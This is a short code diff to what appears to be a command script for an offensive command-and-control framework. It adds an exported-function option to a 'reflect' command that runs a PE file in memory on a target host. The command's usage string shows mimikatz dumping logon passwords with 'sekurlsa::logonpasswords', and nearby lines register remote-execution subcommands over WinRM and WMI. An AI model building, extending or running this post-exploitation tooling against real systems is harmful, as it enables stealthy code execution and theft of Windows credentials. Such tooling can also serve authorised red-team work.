@@ -88,11 +88,13 @@ cmd_rmt_exec.addSubCommands([cmd_rmt_exec_winrm, cmd_rmt_exec_wmi, cmd_rmt_exec_
 let cmd_reflect = ax.create_command("reflect", "Execute PE in memory", "reflect -f /tmp/mimikatz.exe -a \"sekurlsa::logonpasswords\" \"exit\" ", "Task: execute PE inline");
 cmd_reflect.addArgFlagFile("-f", "pe_file", true, "PE file");
 cmd_reflect.addArgFlagString("-a", "args", false, "PE arguments");
+cmd_reflect.addArgFlagString("-e", "expfunc", false, "Exported function to execute (default: DllMain)");
 cmd_reflect.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let pe_file = parsed_json["pe_file"];
     let args = parsed_json["args"] || "";
+    let expfunc = parsed_json["expfunc"] || "DllMain";
     
-    let mod_params = ax.bof_pack("bytes,cstr", [pe_file, args]);
+    let mod_params = ax.bof_pack("bytes,cstr,cstr", [pe_file, args, expfunc]);
     let mod_path = ax.script_dir() + "Shellcode/Reflection/Bin/pe_reflection." + ax.arch(id) + ".bin";
     let message = `Task: executing PE in-memory`;
 
